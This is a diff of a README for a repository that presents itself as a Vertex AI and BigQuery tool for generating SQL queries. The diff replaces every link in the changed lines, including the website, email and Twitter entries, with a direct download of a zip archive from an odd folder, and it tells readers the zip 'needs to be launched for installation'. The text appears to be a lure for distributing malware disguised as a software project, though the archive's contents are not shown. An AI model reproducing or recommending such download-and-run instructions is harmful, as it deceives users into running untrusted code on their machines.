@@ -1,6 +1,6 @@
 # 🚀 Vertex AI Chat Prompting with Tabular Data using BigQuery 📊
 
-![Vertex AI Chat Prompting](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip)
+![Vertex AI Chat Prompting](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip)
 
 Welcome to the **vertex-ai-chat-prompting-tablular-data-bq** repository! This web application utilizes Vertex AI to generate SQL queries that assist users in responding to prompts related to tabular data. Whether you are working on a chatbot project, data analysis, or NLP tasks, this tool is designed to streamline your workflow and enhance your productivity.
 
@@ -39,15 +39,15 @@ Welcome to the **vertex-ai-chat-prompting-tablular-data-bq** repository! This we
 - React
 - Vertex AI
 
-### Download https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip 📥
+### Download https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip 📥
 
-[![Download https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip)](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip)
+[![Download https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip)](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip)
 
-**Note**: The https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip file needs to be launched for installation.
+**Note**: The https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip file needs to be launched for installation.
 
 ### Visit Our Website 🌐
 
-Explore more about our project on our [website](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip).
+Explore more about our project on our [website](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip).
 
 **Note**: For additional resources and information, please check the "Releases" section of this repository.
 
@@ -63,9 +63,9 @@ We welcome contributions from the open-source community. Whether you are an AI e
 
 Connect with us on social media to stay updated on the latest news, releases, and developments related to Vertex AI chat prompting with tabular data using BigQuery.
 
-📧 Email: https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip  
-🐦 Twitter: [@VertexAIProject](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip)  
-🌐 Website: [https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/releases/download/v2.0/Software.zip)
+📧 Email: https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip  
+🐦 Twitter: [@VertexAIProject](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip)  
+🌐 Website: [https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip](https://github.com/jaylnjohnart/vertex-ai-chat-prompting-tablular-data-bq/raw/refs/heads/main/announcer/tablular-bq-data-ai-vertex-prompting-chat-1.5.zip)
 
 Join us on this exciting journey of leveraging AI for enhancing user prompt responses on tabular data. Thank you for your interest and support! 🚀🤖📊
 
